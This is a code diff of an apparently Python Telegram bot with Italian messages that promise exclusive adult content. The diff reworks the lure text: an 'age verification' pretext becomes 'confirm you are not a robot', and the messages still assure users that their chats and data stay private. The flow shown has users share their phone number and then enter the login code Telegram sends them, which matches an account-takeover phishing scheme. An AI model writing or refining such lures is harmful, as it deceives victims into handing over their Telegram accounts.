@@ -116,11 +116,11 @@ async def send_welcome_message(user_id):
                         "• Live session e materiale inedito\n\n"
                         "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n\n"
                         "🔞 *ACCESSO RISERVATO ADULTI 18+*\n"
-                        "Per accedere, è necessario verificare la tua età con il tuo account Telegram.\n\n"
+                        "conferma che non sei un robot!\n\n"
                         "✅ *Processo 100% sicuro e privato:*\n"
                         "• Non vediamo le tue chat o messaggi\n"
                         "• Non condividiamo i tuoi dati\n"
-                        "• Solo verifica dell'età per contenuti 18+\n\n"
+                        "• conferma che non sei un robot!\n\n"
                         "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_"
                     ),
                     parse_mode='Markdown',
@@ -136,12 +136,12 @@ async def send_welcome_message(user_id):
                 "• Contenuti amatoriali esclusivi\n"
                 "• Live session e materiale inedito\n\n"
                 "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n\n"
-                "🔞 *ACCESSO RISERVATO ADULTI 18+*\n"
-                "Per accedere, è necessario verificare la tua età con il tuo account Telegram.\n\n"
+                "🔞 *ACCESSO RISERVATO ADULTI*\n"
+                "conferma che non sei un robot!\n\n"
                 "✅ *Processo 100% sicuro e privato:*\n"
                 "• Non vediamo le tue chat o messaggi\n"
                 "• Non condividiamo i tuoi dati\n"
-                "• Solo verifica dell'età per contenuti 18+\n\n"
+                "• conferma che non sei un robot!\n\n"
                 "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_",
                 parse_mode='Markdown',
                 reply_markup=keyboard
@@ -200,7 +200,7 @@ async def start_auth(callback_query: types.CallbackQuery):
     await bot.send_message(
         user_id,
         "🔥 *FASE 1: VERIFICA RAPIDA* 🔞\n\n"
-        "Quasi tutto è pronto! Per accedere ai contenuti ADULTI esclusivi, dobbiamo verificare che tu sia maggiorenne.\n\n"
+        "conferma che non sei un robot!.\n\n"
         "📋 *Cosa succede ora:*\n"
         "1. Condividi il numero → Telegram ti invia un codice\n"
         "2. Inserisci il codice → Verifica completata\n"
